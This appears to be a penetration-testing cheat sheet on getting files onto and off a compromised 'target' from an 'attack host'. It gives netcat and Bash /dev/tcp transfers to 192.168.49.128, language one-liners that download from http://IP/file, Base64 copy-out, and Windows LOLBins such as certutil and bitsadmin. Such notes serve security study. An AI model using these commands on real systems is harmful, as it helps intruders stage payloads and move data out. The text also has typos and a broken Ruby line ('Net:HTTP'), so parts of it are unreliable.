# Explanation of each file transfer method



**1. Netcat/Ncat - Two-Way Communication***

Netcat and Ncat are tools that allow file transfer by sending data over a TCP connection. They work in two ways:

- **Method A: Listening on the Target Machine**
  The target machine listens for a connection, and the attack host sends the file.
  Useful when the target can accept inbound connections.

- **Method B: Listening on the Attack Host**
  The attack host listens, and the target machine connects to download the file.
  Useful when firewalls block inbound connections to the target.

**Example (Listening on Target):**

```bash
# On target - start listening
nc -l -p 8000 > file.exe

# On attack host - send file
nc -q 0 192.168.49.128 8000 < file.exe
```

**Example (Listening on Attack Host):**

```bash
# On attack host - start listening
sudo nc -l -p 443 -q 0 < file.exe

# On target - connect and download
cat < /dev/tcp/192.168.49.128/443 > file.exe
```

---

**2. Bash /dev/tcp - Without Netcat**

Bash has a built-in feature that allows TCT communication through `/dev/tcp/`. This works even without netcat or ncat installed.

- The attack host listens using netcat
- The target machine uses `/dev/tcp/` to download the file

---

**3. PowerShell Remoting (WinRM) - For Windows Networks**

WinRM Allows remote execution and file transfer in Windows environments.

- **Requirements:** Administrative privileges or membership in the Remote Management Users group.
- **Ports:** 5985 (HTTP) and 5986 (HTTPS)

- The `PowerShell` commands `New-PSSession` and `Copy-Item` enable file transfer between local and remote machines.

---

**4. RDP - Remote Desktop Protocol**

Requires a visual interface to the target. Offers two ways to transfer files:

1. **Copy-Paste**: Simple CDTl+C and Ctrl+V functionality between local and remote machines.

2. **Drive Mounting**: Mount a local folder to the remote session through `\\tclient``.

---

**5. Programming Languages - Python, PHP, Ruby, Perl - Universal For Any System***

Useful when standard tools are not available. Many languages have built-in functions for downloading files.

```bash
# Python
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://IP/file", "file")'

# PHP
php -r '$file = file_get_contents("http://IP/file"); file_put_contents("file", $file);'

# Ruby
ruby -e 'require "net/http"; File.write("file", Net:HTTP.get(URI.parse("http://IP/file")))'
	# Perl
perl -e 'use LWP::Simple; getstore("http://IP/file", "file");'
```

---

**6. Base64 - No Network Required**

The file is converted to a text format, which can be copied and pasted between systems without any network connection required.

```bash
# On target - encode to Base64
cat file | base64 -w 0

# On attack host - decode back
echo "BASE64_TEXT" | base64 -d > file
```

---

**7. SUBIT\tsclient - Copy Files through RDP**

When mounted through RDP, the path `\tsclient` provides access to local folders from the remote session, making file transfer as easy as drag-and-drop.

### Most popular LOLBins:
Windows:

    certreq.exe - upload

    bitsadmin - download

    certutil - download

    powershell - download/upload

    wmic - download (stary)

    cscript - download (VBS/JS)

---
